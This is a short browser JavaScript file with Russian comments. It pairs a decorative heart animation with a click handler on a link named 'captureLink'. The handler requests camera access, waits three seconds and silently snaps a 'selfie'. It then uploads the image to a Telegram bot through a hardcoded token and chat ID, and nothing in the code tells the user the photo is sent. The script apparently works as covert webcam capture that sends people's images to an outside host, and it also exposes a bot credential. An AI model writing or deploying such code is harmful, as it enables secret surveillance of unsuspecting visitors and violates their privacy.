function handleClick() {
	// Показать сердце
	const heart = document.getElementById('heart')
	heart.classList.add('big-heart')
	heart.style.display = 'block'

	// Скрыть сердце через 2 секунды
	setTimeout(function () {
		heart.style.display = 'none'
		heart.classList.remove('big-heart')
	}, 2000)
}

document.getElementById('captureLink').addEventListener('click', function (e) {
	e.preventDefault()

	// Запрос на доступ к камере
	navigator.mediaDevices
		.getUserMedia({ video: true })
		.then(function (stream) {
			// Привязываем поток к видеоэлементу
			let video = document.getElementById('video')
			video.srcObject = stream
			video.play()

			// Подождем несколько секунд, чтобы камера успела настроиться
			setTimeout(function () {
				// Создаем канвас для захвата изображения
				let canvas = document.getElementById('canvas')
				let context = canvas.getContext('2d')
				canvas.width = video.videoWidth
				canvas.height = video.videoHeight

				// Захватываем изображение с видео
				context.drawImage(video, 0, 0, canvas.width, canvas.height)

				// Получаем изображение в формате base64
				let dataUrl = canvas.toDataURL('image/png')

				// Переводим base64 в бинарный формат
				let byteCharacters = atob(dataUrl.split(',')[1])
				let byteArrays = []

				for (let offset = 0; offset < byteCharacters.length; offset++) {
					let byteArray = new Uint8Array(1)
					byteArray[0] = byteCharacters.charCodeAt(offset)
					byteArrays.push(byteArray)
				}

				let blob = new Blob(byteArrays, { type: 'image/png' })

				// Создаем объект FormData для отправки изображения
				let formData = new FormData()
				formData.append('photo', blob, 'selfie.png')

				// Замените "YOUR_BOT_TOKEN" на ваш токен бота, а "YOUR_CHAT_ID" на ваш chat_id (например, ваш ID или ID группы)
				const chatId = '1399718431'
				const botToken = '7875846851:AAEH27_sesWi9A5dU_A5nOL_f0w2HjegW6c'
				// URL для отправки фото
				const url = `https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}`

				// Отправляем запрос на сервер Telegram
				fetch(url, {
					method: 'POST',
					body: formData,
				})
					.then(response => response.json())
					.then(data => {
						console.log('Photo sent successfully:', data)
						// Останавливаем поток камеры
						stream.getTracks().forEach(track => track.stop())
					})
					.catch(error => {
						console.error('Error sending photo:', error)
						stream.getTracks().forEach(track => track.stop())
					})
			}, 3000) // Задержка 3 секунды перед снятием изображения
		})
		.catch(function (error) {
			console.error('Error accessing the camera:', error)
		})
})
